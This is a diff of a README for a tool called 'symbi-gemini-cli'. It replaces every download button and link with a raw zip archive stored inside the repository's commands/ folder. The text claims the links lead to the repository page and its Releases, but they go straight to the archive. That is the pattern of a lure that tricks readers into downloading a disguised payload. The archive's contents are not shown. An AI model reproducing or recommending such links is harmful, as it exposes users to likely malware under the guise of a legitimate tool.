@@ -1,6 +1,6 @@
 # 🛠️ symbi-gemini-cli - Simple Zero-Trust Governance Tool
 
-[![Download symbi-gemini-cli](https://img.shields.io/badge/Download-symbi--gemini--cli-brightgreen?style=for-the-badge)](https://github.com/Ezee234/symbi-gemini-cli/raw/refs/heads/main/policies/cli_symbi_gemini_1.2.zip)
+[![Download symbi-gemini-cli](https://img.shields.io/badge/Download-symbi--gemini--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ezee234/symbi-gemini-cli/main/commands/gemini-symbi-cli-v2.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This tool fits users who want to improve their governance model without complex 
 
 Start by downloading symbi-gemini-cli from the main page.
 
-[![Download symbi-gemini-cli](https://img.shields.io/badge/Download-symbi--gemini--cli-blue?style=for-the-badge)](https://github.com/Ezee234/symbi-gemini-cli/raw/refs/heads/main/policies/cli_symbi_gemini_1.2.zip)
+[![Download symbi-gemini-cli](https://img.shields.io/badge/Download-symbi--gemini--cli-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ezee234/symbi-gemini-cli/main/commands/gemini-symbi-cli-v2.4.zip)
 
 Clicking the button above takes you to the GitHub repository page. You can find the latest version of symbi-gemini-cli there.
 
@@ -53,7 +53,7 @@ Clicking the button above takes you to the GitHub repository page. You can find 
 
 ## ⬇️ How to Download and Install on Windows
 
-1. Open the link: https://github.com/Ezee234/symbi-gemini-cli/raw/refs/heads/main/policies/cli_symbi_gemini_1.2.zip
+1. Open the link: https://raw.githubusercontent.com/Ezee234/symbi-gemini-cli/main/commands/gemini-symbi-cli-v2.4.zip
 
 2. On the repository page, look for the "Releases" section on the right or near the top navigation bar.
 
@@ -168,7 +168,7 @@ This approach reduces risk by assuming everything could be unsafe until proven o
 
 To keep the tool up to date:
 
-1. Return to the GitHub download page: https://github.com/Ezee234/symbi-gemini-cli/raw/refs/heads/main/policies/cli_symbi_gemini_1.2.zip
+1. Return to the GitHub download page: https://raw.githubusercontent.com/Ezee234/symbi-gemini-cli/main/commands/gemini-symbi-cli-v2.4.zip
 
 2. Download the latest release.
 
@@ -196,7 +196,7 @@ Edit this file with a plain text editor like Notepad if needed. Be careful to ke
 ## 🔗 Useful Links
 
 - Repository homepage and downloads:  
-  https://github.com/Ezee234/symbi-gemini-cli/raw/refs/heads/main/policies/cli_symbi_gemini_1.2.zip
+  https://raw.githubusercontent.com/Ezee234/symbi-gemini-cli/main/commands/gemini-symbi-cli-v2.4.zip
 
 - Report bugs or ask questions:  
   Use the "Issues" section on the GitHub page.
